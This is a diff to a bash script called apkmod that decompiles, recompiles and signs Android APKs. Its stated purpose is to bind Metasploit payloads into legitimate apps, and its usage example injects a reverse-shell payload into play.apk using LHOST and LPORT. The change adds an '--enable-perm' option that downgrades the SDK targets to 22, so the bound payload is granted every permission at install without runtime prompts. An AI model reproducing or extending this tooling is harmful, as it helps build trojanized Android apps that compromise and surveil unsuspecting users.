@@ -7,7 +7,7 @@
 ########################################
 
 CWD=$(pwd)
-VERSION="1.8"
+VERSION="1.9"
 
 #colors
 cyan='\033[1;36m'                       
@@ -34,10 +34,29 @@ usage() {
     --no-res        prevents decompiling of resources
     --no-smali      prevents dessambly of dex files
     --no-assets     prevents decoding of unknown assets file
-    --frame-path    The folder location where framework files should be stored/read from
+    --frame-path    The folder location where
+    framework files should be stored/read from
+    --enable-perm   Enable all permissions in binded payload
     ${yellow}Example:
-    ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444  ${purple}bind the payload with play.apk and saves output in given directory.
-    ${green}Apkmod is like a bridge between your termux and alpine by which you can easily decompile recompile signapk and even bind the payload using metasploit\n${reset}"
+    ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444
+    ${purple}bind the payload with play.apk and saves output in given directory.
+    ${green}Apkmod is like a bridge between your termux and 
+    alpine by which you can easily decompile recompile signapk and 
+    even bind the payload using metasploit\n${reset}"
+}
+
+enable_perm() {
+    tmp_dir=$(mktemp -d)
+    decompile ${1} ${tmp_dir} --no-src --no-assets
+    for i in minSdkVersion targetSdkVersion; do
+        sed -i "s/$i.*/$i: '22'/" $tmp_dir/apktool.yml
+    done
+    USE_AAPT2=yes
+    recompile ${tmp_dir} ${2}
+    signapk ${2} temp.apk
+    mv temp.apk ${2}
+    rm -r $tmp_dir
+    print_status "Done"
 }
 
 error_msg() {
@@ -107,7 +126,7 @@ signapk() {
         error_msg "Can't sign, take screenshot and open a issue on github"
         exit 1
     fi
-	print_status "Signed to ${2}"
+	print_status "Signed Successfully"
 }
 
 #########################
@@ -156,7 +175,7 @@ validate_input() {
 		exit 1
 	fi
 
-	if [ "${1}" = "-d" -o "${1}" = "-s" ]; then
+	if [ "${1}" = "-d" -o "${1}" = "-s" -o "${1}" = "--enable-perm" ]; then
 		file_exist "${2}"
 		dir_exist "${3%\/*}"
 	fi
@@ -262,6 +281,11 @@ while getopts ":z:d:r:s:b:o:ahvuVR:-:" opt; do
                 frame-path*)
                     FRAMEPATH="${OPTARG#*=}"
                     ;;
+                enable-perm*)
+                    ACTION="enable_perm"
+                    ARG="--enable-perm"
+                    in_abs_path=$(readlink -m ${OPTARG#*=})
+                    ;;
             esac
             ;;
         R)
@@ -296,6 +320,8 @@ elif [ "${ARG}" = "-s" ]; then
 elif [ "${ARG}" = "-b" ]; then
     validate_input ${ARG} ${in_abs_path} ${out_abs_path} ${LHOST} ${LPORT}
 elif [ "${ARG}" = "-z" ]; then
+    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
+elif [ "${ARG}" = "--enable-perm" ]; then
     validate_input ${ARG} ${in_abs_path} ${out_abs_path}
 fi
 
